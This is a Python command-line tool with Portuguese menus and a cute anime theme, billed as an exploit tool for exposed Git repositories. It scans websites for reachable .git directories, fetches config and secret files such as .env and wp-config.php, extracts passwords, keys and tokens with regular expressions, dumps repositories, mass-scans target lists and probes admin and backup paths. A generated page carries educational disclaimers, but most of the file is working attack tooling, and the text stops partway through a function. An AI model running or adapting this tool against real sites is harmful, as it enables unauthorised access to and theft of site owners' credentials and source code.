import os
import sys
import random
import requests
import threading
import time
import re
import subprocess
from datetime import datetime

# Configurações de cores para o terminal
class Colors:
    PINK = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAGENTA = '\033[35m'
    LIGHT_CYAN = '\033[1;36m'

# Carinhas fofas e emojis para mensagens
KAWAII_FACES = [
    "(◕‿◕✿)", "(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧", "✧･ﾟ: *✧･ﾟ:*", "(◠‿◠)", "(ᗒᗨᗕ)", 
    "(★ω★)", "(ﾉ´ヮ`)ﾉ*: ･ﾟ", "(ノ°ο°)ノ", "(◕‿◕)♡", "ヽ(>∀<☆)ノ",
    "(づ｡◕‿‿◕｡)づ", "♡(˃͈ દ ˂͈ ༶ )", "(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧", "(◍•ᴗ•◍)❤", 
    "♪(๑ᴖ◡ᴖ๑)♪", "(っ◔◡◔)っ ♥", "(´･ᴗ･ ` )", "(●´□`)♡", "(´｡• ᵕ •｡`) ♡",
    "🌸", "🍓", "🍬", "🎀", "💖", "✨", "🎇", "🧁", "🐇", "🦄"
]

def get_kawaii_face():
    return random.choice(KAWAII_FACES)

def print_banner():
    banner = f"""
{Colors.PINK}╔════════════════════════════════════════════════════════════════════════════╗
{Colors.PINK}║{Colors.BOLD}{Colors.MAGENTA}   ♡🌸🍓 Kawaii Git Exploit Tool Ultra Fofinha 🍓🌸♡     {Colors.PINK}║
{Colors.PINK}║                                                                        ║
{Colors.PINK}║    {Colors.LIGHT_CYAN}✧･ﾟ: *✧･ﾟ:* Explorador de Vulnerabilidades Git ✧･ﾟ: *✧･ﾟ:*    {Colors.PINK}║
{Colors.PINK}║                                                                        ║
{Colors.PINK}║    {Colors.YELLOW}Desenvolvido com 💖 pela Rede Valkiria - Contra CP & Fraudes       {Colors.PINK}║
{Colors.PINK}║                                                                        ║
{Colors.PINK}║    {Colors.CYAN}Versão: 2.0 Fofinha {get_kawaii_face()} {datetime.now().year}                            {Colors.PINK}║
{Colors.PINK}╚════════════════════════════════════════════════════════════════════════════╝
{Colors.END}"""
    print(banner)

def print_menu():
    menu = f"""
{Colors.PINK}╔═══════════════════════════ 🌸 MENU 🌸 ═══════════════════════════╗
{Colors.PINK}║ {Colors.CYAN}1. Verificar Git exposto                        {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}2. Explorar arquivos do Git                     {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}3. Baixar repositório Git                       {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}4. Buscar credenciais em arquivos               {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}5. Varredura em massa de sites                  {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}6. Scanner Avançado de Diretórios              {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}7. Criar site educativo                        {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}8. Iniciar servidor local                      {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.RED}0. Sair                                         (╥﹏╥) {Colors.PINK}║
{Colors.PINK}╚══════════════════════════════════════════════════════════════════════╝
{Colors.END}"""
    print(menu)

def press_enter_to_continue():
    input(f"\n{Colors.PINK}🌸 Pressione Enter para continuar... {get_kawaii_face()}{Colors.END}")
    print("\n" * 2)

def create_site():
    try:
        site_dir = "kawaii_site"
        if not os.path.exists(site_dir):
            os.makedirs(site_dir)
        
        # Criar arquivo index.html
        html_content = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Git Exposed - Rede Valkiria</title>
    <style>
        body {{
            font-family: 'Comic Sans MS', cursive, sans-serif;
            background-color: #fff0f5;
            color: #ff69b4;
            margin: 0;
            padding: 0;
            background-image: url('https://i.pinimg.com/originals/49/61/1f/49611f1c5a3e0a8e963f8a3b8e9f1416.gif');
            background-size: cover;
        }}
        
        .container {{
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(255, 240, 245, 0.95);
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(255, 105, 180, 0.6);
            margin-top: 30px;
            margin-bottom: 30px;
            border: 3px dashed #ff69b4;
        }}
        
        header {{
            text-align: center;
            padding: 20px 0;
            border-bottom: 3px dotted #ff69b4;
            margin-bottom: 30px;
        }}
        
        h1 {{
            color: #ff1493;
            font-size: 2.8em;
            text-shadow: 3px 3px 5px rgba(255, 182, 193, 0.8);
            margin-bottom: 10px;
        }}
        
        h2 {{
            color: #ff69b4;
            border-bottom: 2px dotted #ff69b4;
            padding-bottom: 8px;
            font-size: 1.8em;
        }}
        
        .kawaii {{
            font-size: 1.8em;
            margin: 15px 0;
            color: #db7093;
        }}
        
        .anime-girl {{
            float: right;
            width: 220px;
            margin-left: 25px;
            animation: bounce 2s infinite;
            border-radius: 20px;
            border: 3px solid #ff69b4;
        }}
        
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-25px); }}
        }}
        
        .dancing {{
            display: inline-block;
            animation: dance 1s infinite alternate;
            font-size: 1.2em;
        }}
        
        @keyframes dance {{
            0% {{ transform: rotate(-10deg); }}
            100% {{ transform: rotate(10deg); }}
        }}
        
        .warning {{
            background-color: #fff0f5;
            border-left: 5px solid #ff69b4;
            padding: 15px;
            margin: 20px 0;
            border-radius: 10px;
            border: 2px dashed #ff1493;
        }}
        
        footer {{
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 3px dotted #ff69b4;
            font-size: 1em;
            color: #db7093;
        }}
        
        .btn {{
            background-color: #ff69b4;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 15px 0;
            transition: all 0.3s;
            font-size: 1.1em;
            box-shadow: 0 4px 8px rgba(255, 105, 180, 0.3);
        }}
        
        .btn:hover {{
            background-color: #ff1493;
            transform: scale(1.1);
            box-shadow: 0 6px 12px rgba(255, 20, 147, 0.4);
        }}
        
        ul {{
            list-style-type: none;
            padding-left: 20px;
        }}
        
        ul li:before {{
            content: "🌸 ";
        }}
        
        .heart {{
            color: #ff69b4;
            animation: heartbeat 1.5s infinite;
            display: inline-block;
        }}
        
        @keyframes heartbeat {{
            0% {{ transform: scale(1); }}
            25% {{ transform: scale(1.2); }}
            50% {{ transform: scale(1); }}
            75% {{ transform: scale(1.2); }}
            100% {{ transform: scale(1); }}
        }}
        
        .floating {{
            animation: floating 3s ease-in-out infinite;
        }}
        
        @keyframes floating {{
            0% {{ transform: translateY(0px); }}
            50% {{ transform: translateY(-15px); }}
            100% {{ transform: translateY(0px); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Git Exposed Vulnerability <span class="dancing">(◕‿◕✿)</span></h1>
            <p class="kawaii">✧･ﾟ: *✧･ﾟ:* Entenda a vulnerabilidade *:･ﾟ✧*:･ﾟ✧</p>
        </header>
        
        <section>
            <img src="https://i.pinimg.com/originals/0f/2a/c5/0f2ac5e94e1a9a0d5e7c2f4e4b8a8d2a.gif" alt="Anime Girl" class="anime-girl floating">
            
            <h2>🌸 O que é a vulnerabilidade Git exposto?</h2>
            <p>Um repositório Git exposto ocorre quando o diretório <code>.git</code> de um site fica acessível publicamente na internet. Isso permite que qualquer pessoa baixe todo o código-fonte do projeto, incluindo possíveis credenciais e informações sensíveis.</p>
            
            <div class="warning">
                <h3>✧･ﾟ: * Atenção! *:･ﾟ✧</h3>
                <p>Esta ferramenta foi desenvolvida apenas para fins educacionais e de teste de segurança. Nunca use essas informações para atividades ilegais!</p>
                <p class="kawaii">(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Seja um hacker ético! ✧･ﾟ: *✧･ﾟ:*</p>
            </div>
            
            <h2>🌸 O que o Kawaii Git Exploit Tool faz?</h2>
            <ul>
                <li><span class="heart">♡</span> Verifica se um site tem o diretório .git exposto</li>
                <li><span class="heart">♡</span> Explora arquivos sensíveis como config, .env, etc.</li>
                <li><span class="heart">♡</span> Busca credenciais em arquivos do Git</li>
                <li><span class="heart">♡</span> Permite baixar o repositório Git inteiro</li>
                <li><span class="heart">♡</span> Faz varredura em massa de vários sites</li>
                <li><span class="heart">♡</span> Escaneia diretórios sensíveis</li>
            </ul>
            
            <h2>🌸 O que o script NÃO faz?</h2>
            <ul>
                <li>✘ Não realiza ataques DDoS ou brute force</li>
                <li>✘ Não explora vulnerabilidades além do Git exposto</li>
                <li>✘ Não modifica ou deleta arquivos no servidor</li>
                <li>✘ Não realiza atividades ilegais</li>
            </ul>
            
            <h2>🌸 Como se proteger?</h2>
            <p>Para proteger seu site:</p>
            <ol>
                <li>Nunca deixe o diretório .git acessível publicamente</li>
                <li>Use arquivos .htaccess para bloquear acesso</li>
                <li>Remova credenciais do código antes de fazer commit</li>
                <li>Use variáveis de ambiente para informações sensíveis</li>
                <li>Revise regularmente as permissões de arquivos</li>
            </ol>
            
            <div style="text-align: center;">
                <a href="https://github.com/" class="btn" target="_blank">Saiba mais sobre segurança Git</a>
                <br>
                <span class="dancing">(っ◔◡◔)っ ♥ Aprenda com responsabilidade! ♥</span>
            </div>
        </section>
        
        <footer>
            <p>Desenvolvido com <span class="heart">♡</span> pela <strong>Rede Valkiria</strong> - Grupo hacker anti CP e fraudes</p>
            <p>✧･ﾟ: *✧･ﾟ:* Nosso objetivo é uma internet mais segura *:･ﾟ✧*:･ﾟ✧</p>
            <p class="kawaii">(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Obrigado por usar nossa ferramenta! ✧･ﾟ: *✧･ﾟ:*</p>
        </footer>
    </div>
    
    <script>
        // Animação adicional
        document.querySelectorAll('h2').forEach(h2 => {{
            h2.innerHTML = h2.innerHTML + ' <span class="dancing">✿</span>';
        }});
        
        // Efeito de confete kawaii
        function createConfetti() {{
            const confetti = document.createElement('div');
            const emojis = ['🌸', '🍓', '🍬', '🎀', '💖', '✨', '🎇', '🧁'];
            confetti.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
            confetti.style.position = 'fixed';
            confetti.style.fontSize = Math.random() * 20 + 15 + 'px';
            confetti.style.top = '-30px';
            confetti.style.left = Math.random() * window.innerWidth + 'px';
            confetti.style.opacity = Math.random();
            confetti.style.animation = 'fall ' + (Math.random() * 5 + 3) + 's linear infinite';
            confetti.style.zIndex = '9999';
            document.body.appendChild(confetti);
            
            setTimeout(() => {{
                confetti.remove();
            }}, 5000);
        }}
        
        // Adiciona estilo para a animação de queda
        const style = document.createElement('style');
        style.innerHTML = `
            @keyframes fall {{
                to {{
                    transform: translateY(100vh) rotate(360deg);
                }}
            }}
        `;
        document.head.appendChild(style);
        
        // Cria confetti periodicamente
        setInterval(createConfetti, 300);
        
        // Efeito ao clicar
        document.addEventListener('click', function(e) {{
            const heart = document.createElement('div');
            heart.innerHTML = '💖';
            heart.style.position = 'fixed';
            heart.style.fontSize = '25px';
            heart.style.left = e.clientX + 'px';
            heart.style.top = e.clientY + 'px';
            heart.style.animation = 'heartClick 1s forwards';
            document.body.appendChild(heart);
            
            setTimeout(() => {{
                heart.remove();
            }}, 1000);
        }});
        
        const heartStyle = document.createElement('style');
        heartStyle.innerHTML = `
            @keyframes heartClick {{
                0% {{ transform: scale(1); opacity: 1; }}
                100% {{ transform: scale(3); opacity: 0; }}
            }}
        `;
        document.head.appendChild(heartStyle);
    </script>
</body>
</html>
"""
        
        with open(os.path.join(site_dir, "index.html"), "w", encoding="utf-8") as f:
            f.write(html_content)
        
        # Criar arquivo CSS adicional
        css_content = """
/* Estilos adicionais podem ser colocados aqui */
.rainbow-text {
    background-image: linear-gradient(to left, violet, indigo, blue, green, yellow, orange, red);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    animation: rainbow 3s linear infinite;
    background-size: 200% 100%;
}

@keyframes rainbow {
    0% { background-position: 0% 50%; }
    100% { background-position: 100% 50%; }
}

.bunny {
    position: fixed;
    bottom: 20px;
    right: 20px;
    font-size: 40px;
    animation: hop 1s infinite alternate;
}

@keyframes hop {
    from { transform: translateY(0) rotate(0deg); }
    to { transform: translateY(-20px) rotate(10deg); }
}
"""
        with open(os.path.join(site_dir, "styles.css"), "w", encoding="utf-8") as f:
            f.write(css_content)
        
        print(f"\n{Colors.GREEN}✧･ﾟ: *✧･ﾟ:* Site educativo criado na pasta 'kawaii_site' *:･ﾟ✧*:･ﾟ✧{Colors.END}")
        print(f"{Colors.CYAN}Você pode visualizá-lo com a opção 8 do menu {get_kawaii_face()}{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}(╥﹏╥) Erro ao criar site: {str(e)}{Colors.END}")

def start_local_server():
    try:
        site_dir = "kawaii_site"
        if not os.path.exists(site_dir):
            print(f"\n{Colors.RED}(╥﹏╥) A pasta 'kawaii_site' não existe. Crie o site primeiro com a opção 7.{Colors.END}")
            return
        
        print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Iniciando servidor local *:･ﾟ✧*:･ﾟ✧{Colors.END}")
        print(f"{Colors.CYAN}Abra seu navegador em: {Colors.BOLD}http://localhost:8080{Colors.END}")
        print(f"{Colors.YELLOW}Pressione Ctrl+C para parar o servidor{Colors.END}")
        
        try:
            os.chdir(site_dir)
            subprocess.run(["python", "-m", "http.server", "8080"])
        except KeyboardInterrupt:
            print(f"\n{Colors.PINK}Servidor parado {get_kawaii_face()}{Colors.END}")
        except Exception as e:
            print(f"\n{Colors.RED}Erro ao iniciar servidor: {str(e)}{Colors.END}")
        finally:
            os.chdir("..")
    except Exception as e:
        print(f"\n{Colors.RED}(╥﹏╥) Erro ao iniciar servidor: {str(e)}{Colors.END}")

def check_git_exposed(url):
    try:
        print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Verificando {url} *:･ﾟ✧*:･ﾟ✧{Colors.END}")
        
        if not url.endswith('/.git/'):
            url = url.rstrip('/') + '/.git/'
        
        files_to_check = [
            'HEAD', 'objects/info/packs', 'description',
            'config', 'COMMIT_EDITMSG', 'index',
            'info/refs', 'logs/HEAD', 'refs/heads/master'
        ]
        
        found_files = []
        
        for filename in files_to_check:
            target_url = url + filename
            print(f"{Colors.CYAN}🌸 Verificando: {target_url}{Colors.END}", end='\r')
            
            try:
                response = requests.get(target_url, timeout=10)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}★ Arquivo encontrado: {filename.ljust(50)}{Colors.END}")
                    found_files.append(filename)
                else:
                    print(f"{Colors.YELLOW}🌸 Arquivo não encontrado: {filename.ljust(50)}{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}🌸 Erro ao verificar {filename}: {str(e).ljust(50)}{Colors.END}")
        
        # Verificar diretório de objetos
        objects_url = url + 'objects/'
        print(f"{Colors.CYAN}🌸 Verificando diretório de objetos...{Colors.END}", end='\r')
        try:
            response = requests.get(objects_url, timeout=10)
            if response.status_code == 200:
                print(f"{Colors.GREEN}★ Diretório de objetos encontrado!{Colors.END}")
                found_files.append('objects/')
            else:
                print(f"{Colors.YELLOW}🌸 Diretório de objetos não encontrado.{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}🌸 Erro ao verificar objetos: {str(e)}{Colors.END}")
        
        if len(found_files) >= 3:
            print(f"\n{Colors.GREEN}{get_kawaii_face()} Git exposto encontrado! Arquivos descobertos: {len(found_files)}{Colors.END}")
            return True, found_files
        else:
            print(f"\n{Colors.RED}(´• ω •`) Git não exposto ou inacessível{Colors.END}")
            return False, []
    except Exception as e:
        print(f"\n{Colors.RED}(╥﹏╥) Erro na verificação: {str(e)}{Colors.END}")
        return False, []

def explore_git(url, found_files):
    try:
        print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Explorando arquivos em {url} *:･ﾟ✧*:･ﾟ✧{Colors.END}")
        
        interesting_files = [
            'config', 'HEAD', 'logs/HEAD', 'index',
            'COMMIT_EDITMSG', 'info/exclude', 'description',
            '.env', 'wp-config.php', 'config.php',
            'database.yml', 'settings.py', 'credentials.json',
            'secrets.ini', 'config.json', 'appsettings.json',
            'configuration.php', 'db.php', 'database.ini',
            'secret_key', 'oauth_token', 'aws_credentials'
        ]
        
        sensitive_files = []
        
        for filename in interesting_files:
            target_url = url + filename
            print(f"{Colors.CYAN}🌸 Verificando: {filename}{Colors.END}", end='\r')
            
            try:
                response = requests.get(target_url, timeout=10)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}★ Arquivo encontrado: {filename.ljust(50)}{Colors.END}")
                    sensitive_files.append(filename)
                    
                    # Verificar automaticamente por credenciais em arquivos sensíveis
                    if any(x in filename.lower() for x in ['config', '.env', 'wp-config', 'secret', 'credential']):
                        search_credentials_in_file(target_url, response.text)
                else:
                    print(f"{Colors.YELLOW}🌸 Arquivo não encontrado: {filename.ljust(50)}{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}🌸 Erro ao verificar {filename}: {str(e).ljust(50)}{Colors.END}")
        
        if sensitive_files:
            print(f"\n{Colors.GREEN}{get_kawaii_face()} Arquivos sensíveis encontrados: {len(sensitive_files)}{Colors.END}")
            print(f"{Colors.YELLOW}🌸 Arquivos encontrados: {', '.join(sensitive_files)}{Colors.END}")
        else:
            print(f"\n{Colors.YELLOW}(´• ω •`) Nenhum arquivo sensível encontrado{Colors.END}")
        
        return sensitive_files
    except Exception as e:
        print(f"\n{Colors.RED}(╥﹏╥) Erro na exploração: {str(e)}{Colors.END}")
        return []

def download_git_repo(url):
    try:
        print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Baixando repositório de {url} *:･ﾟ✧*:･ﾟ✧{Colors.END}")
        
        # Verificar se o git-dumper está instalado
        try:
            subprocess.run(["git-dumper", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            git_dumper_installed = True
        except:
            git_dumper_installed = False
        
        if git_dumper_installed:
            # Usar git-dumper se estiver instalado
            output_dir = url.split('//')[-1].replace('/', '_') + "_git"
            print(f"{Colors.CYAN}🌸 Usando git-dumper para baixar o repositório...{Colors.END}")
            
            try:
                subprocess.run(["git-dumper", url, output_dir], check=True)
                print(f"\n{Colors.GREEN}{get_kawaii_face()} Repositório baixado com sucesso em: {output_dir}{Colors.END}")
                return True
            except subprocess.CalledProcessError as e:
                print(f"\n{Colors.RED}(╥﹏╥) Erro ao baixar repositório: {str(e)}{Colors.END}")
                return False
        else:
            # Método manual se git-dumper não estiver instalado
            print(f"{Colors.YELLOW}🌸 git-dumper não encontrado. Tentando método manual...{Colors.END}")
            
            if not url.endswith('/.git/'):
                url = url.rstrip('/') + '/.git/'
            
            output_dir = url.split('//')[-1].replace('/', '_') + "_manual"
            os.makedirs(output_dir, exist_ok=True)
            
            files_to_download = [
                'HEAD', 'objects/info/packs', 'description',
                'config', 'COMMIT_EDITMSG', 'index',
                'info/refs', 'logs/HEAD', 'refs/heads/master'
            ]
            
            success = True
            
            for filename in files_to_download:
                target_url = url + filename
                output_path = os.path.join(output_dir, filename)
                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                
                print(f"{Colors.CYAN}🌸 Baixando: {filename}{Colors.END}", end='\r')
                
                try:
                    response = requests.get(target_url, timeout=10)
                    if response.status_code == 200:
                        with open(output_path, 'wb') as f:
                            f.write(response.content)
                        print(f"{Colors.GREEN}✓ Arquivo baixado: {filename.ljust(50)}{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}🌸 Arquivo não encontrado: {filename.ljust(50)}{Colors.END}")
                        success = False
                except Exception as e:
                    print(f"{Colors.RED}🌸 Erro ao baixar {filename}: {str(e).ljust(50)}{Colors.END}")
                    success = False
            
            if success:
                print(f"\n{Colors.GREEN}{get_kawaii_face()} Download manual concluído em: {output_dir}{Colors.END}")
                print(f"{Colors.YELLOW}🌸 Nota: O download manual pode não incluir todos os arquivos.{Colors.END}")
                return True
            else:
                print(f"\n{Colors.RED}(╥﹏╥) Download manual incompleto. Alguns arquivos falharam.{Colors.END}")
                return False
    except Exception as e:
        print(f"\n{Colors.RED}(╥﹏╥) Erro no download: {str(e)}{Colors.END}")
        return False

def search_credentials_in_file(url, content=None):
    try:
        if content is None:
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    content = response.text
                else:
                    print(f"{Colors.RED}(╥﹏╥) Erro ao acessar arquivo: {response.status_code}{Colors.END}")
                    return
            except Exception as e:
                print(f"{Colors.RED}(ﾉﾟ0ﾟ)ﾉ~ Erro: {str(e)}{Colors.END}")
                return
        
        patterns = [
            r'(?i)user(name)?\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)pass(word)?\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)host\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)db(name)?\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)api_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)secret\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)token\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)password\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)connection_?string\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)access_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)secret_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)private_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)encryption_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]'
        ]
        
        found_creds = []
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            for match in matches:
                if isinstance(match, tuple):
                    # Pegar o último elemento não vazio do grupo de captura
                    value = next((x for x in match[::-1] if x), None)
                    if value and value not in found_creds:
                        found_creds.append(value)
                elif match and match not in found_creds:
                    found_creds.append(match)
        
        if found_creds:
            print(f"\n{Colors.GREEN}(★ω★) Credenciais encontradas no arquivo!{Colors.END}")
            for cred in found_creds:
                print(f"{Colors.RED}• {cred}{Colors.END}")
            
            # Perguntar se deseja salvar as credenciais encontradas
            save = input(f"\n{Colors.CYAN}🌸 Deseja salvar as credenciais encontradas em um arquivo? (s/n): {Colors.END}").lower()
            if save == 's':
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"credenciais_encontradas_{timestamp}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"Credenciais encontradas em: {url}\n")
                    f.write(f"Data: {datetime.now()}\n\n")
                    for cred in found_creds:
                        f.write(f"{cred}\n")
                print(f"{Colors.GREEN}🌸 Credenciais salvas em: {filename}{Colors.END}")
        else:
            print(f"\n{Colors.YELLOW}(´･_･`) Nenhuma credencial encontrada no arquivo{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}(╥﹏╥) Erro na busca de credenciais: {str(e)}{Colors.END}")

def mass_scan(targets):
    try:
        print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Iniciando varredura em massa *:･ﾟ✧*:･ﾟ✧{Colors.END}")
        print(f"{Colors.CYAN}🌸 Alvos a verificar: {len(targets)}{Colors.END}")
        
        vulnerable_sites = []
        
        for i, target in enumerate(targets, 1):
            target = target.strip()
            if not target:
                continue
            
            print(f"\n{Colors.PINK}[{i}/{len(targets)}] Verificando: {target}{Colors.END}")
            
            # Verificar caminhos .git padrão e alternativos
            paths_to_check = ['/.git/', '/.git/HEAD', '/git/HEAD', '/.git/config']
            
            found = False
            found_files = []
            
            for path in paths_to_check:
                url = target.rstrip('/') + path
                print(f"{Colors.CYAN}🌸 Testando: {path}{Colors.END}", end='\r')
                
                try:
                    response = requests.get(url, timeout=10)
                    if response.status_code == 200:
                        found = True
                        found_files.append(path.split('/')[-1] or path.split('/')[-2])
                        print(f"{Colors.GREEN}★ Vulnerabilidade encontrada em {target}{Colors.END}")
                        break
                except:
                    continue
            
            if found:
                vulnerable_sites.append((target, found_files))
        
        if vulnerable_sites:
            print(f"\n{Colors.GREEN}{get_kawaii_face()} Varredura concluída - {len(vulnerable_sites)} alvos vulneráveis encontrados!{Colors.END}")
            
            # Perguntar se deseja salvar os resultados
            save = input(f"\n{Colors.CYAN}🌸 Deseja salvar os resultados em um arquivo? (s/n): {Colors.END}").lower()
            if save == 's':
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"resultados_varredura_{timestamp}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"Resultados da varredura em massa - {datetime.now()}\n")
                    f.write(f"Total de alvos verificados: {len(targets)}\n")
                    f.write(f"Alvos vulneráveis encontrados: {len(vulnerable_sites)}\n\n")
                    
                    for site, files in vulnerable_sites:
                        f.write(f"★ Alvo vulnerável: {site}\n")
                        f.write(f"Arquivos encontrados: {', '.join(files)}\n")
                        f.write("-" * 50 + "\n")
                
                print(f"{Colors.GREEN}🌸 Resultados salvos em: {filename}{Colors.END}")
            
            # Mostrar resumo dos resultados
            print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Resumo da Varredura *:･ﾟ✧*:･ﾟ✧{Colors.END}")
            for site, files in vulnerable_sites:
                print(f"\n{Colors.RED}★ Alvo vulnerável: {site}{Colors.END}")
                print(f"{Colors.YELLOW}🌸 Arquivos encontrados: {', '.join(files)}{Colors.END}")
        else:
            print(f"\n{Colors.YELLOW}(´• ω •`) Varredura concluída - nenhum alvo vulnerável encontrado{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}(╥﹏╥) Erro na varredura em massa: {str(e)}{Colors.END}")

def advanced_directory_scanner(url):
    try:
        print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Iniciando Scanner Avançado *:･ﾟ✧*:･ﾟ✧{Colors.END}")
        print(f"{Colors.CYAN}🌸 Alvo: {url}{Colors.END}")
        
        # Lista de diretórios comuns para verificar
        common_dirs = [
            'admin', 'backup', 'config', 'database', 'logs',
            'secret', 'private', 'uploads', 'download', 'tmp',
            'wp-admin', 'wp-content', 'wp-includes', 'vendor',
            'storage', 'assets', 'images', 'js', 'css',
            'cgi-bin', 'phpmyadmin', 'mysql', 'sql', 'backups',
            'old', 'test', 'dev', 'beta', 'alpha'
        ]
        
        # Lista de arquivos comuns para verificar
        common_files = [
            'config.php', 'wp-config.php', '.env', 'settings.py',
            'database.yml', 'credentials.json', 'secrets.ini',
            'backup.zip', 'dump.sql', 'backup.tar.gz',
            'index.php', 'login.php', 'admin.php',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml',
            'phpinfo.php', 'test.php', 'info.php'
        ]
        
        found_items = []
        
        # Verificar diretórios
        print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Verificando diretórios comuns *:･ﾟ✧*:･ﾟ✧{Colors.END}")
        for directory in common_dirs:
            target_url = url.rstrip('/') + '/' + directory + '/'
            print(f"{Colors.CYAN}🌸 Verificando: {directory}/", end='\r')
            
            try:
                response = requests.get(target_url, timeout=10)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}★ Diretório encontrado: {directory}/".ljust(70) + f"{Colors.END}")
                    found_items.append(f"Diretório: {directory}/")
                elif response.status_code == 403:
                    print(f"{Colors.YELLOW}🌸 Acesso proibido: {directory}/ (código 403)".ljust(70) + f"{Colors.END}")
                    found_items.append(f"Diretório (403): {directory}/")
            except Exception as e:
                print(f"{Colors.RED}🌸 Erro ao verificar {directory}/: {str(e)}".ljust(70) + f"{Colors.END}")
        
        # Verificar arquivos
        print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Verificando arquivos comuns *:･ﾟ✧*:･ﾟ✧{Colors.END}")
        for filename in common_files:
            target_url = url.rstrip('/') + '/' + filename
            print(f"{Colors.CYAN}🌸 Verificando: {filename}", end='\r')
            
            try:
                response = requests.get(target_url, timeout=10)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}★ Arquivo encontrado: {filename}".ljust(70) + f"{Colors.END}")
                    found_items.append(f"Arquivo: {filename}")
                    
                    # Verificar automaticamente por credenciais em arquivos sensíveis
                    if any(x in filename.lower() for x in ['config', '.env', 'wp-config', 'secret', 'credential', 'database']):
                        search_credentials_in_file(target_url, response.text)
                elif response.status_code == 403:
                    print(f"{Colors.YELLOW}🌸 Acesso proibido: {filename} (código 403)".ljust(70) + f"{Colors.END}")
                    found_items.append(f"Arquivo (403): {filename}")
            except Exception as e:
                print(f"{Colors.RED}🌸 Erro ao verificar {filename}: {str(e)}".ljust(70) + f"{Colors.END}")
        
        if found_items:
            print(f"\n{Colors.GREEN}{get_kawaii_face()} Scanner concluído - {len(found_items)} itens encontrados!{Colors.END}")
            
            # Perguntar se deseja salvar os resultados
            save = input(f"\n{Colors.CYAN}🌸 Deseja salvar os resultados em um arquivo? (s/n): {Colors.END}").lower()
            if save == 's':
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"resultados_scanner_{timestamp}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"Resultados do scanner - {datetime.now()}\n")
                    f.write(f"Alvo: {url}\n\n")
                    
                    for item in found_items:
                        f.write(f"{item}\n")
                
                print(f"{Colors.GREEN}🌸 Resultados salvos em: {filename}{Colors.END}")
            
            # Mostrar resumo dos resultados
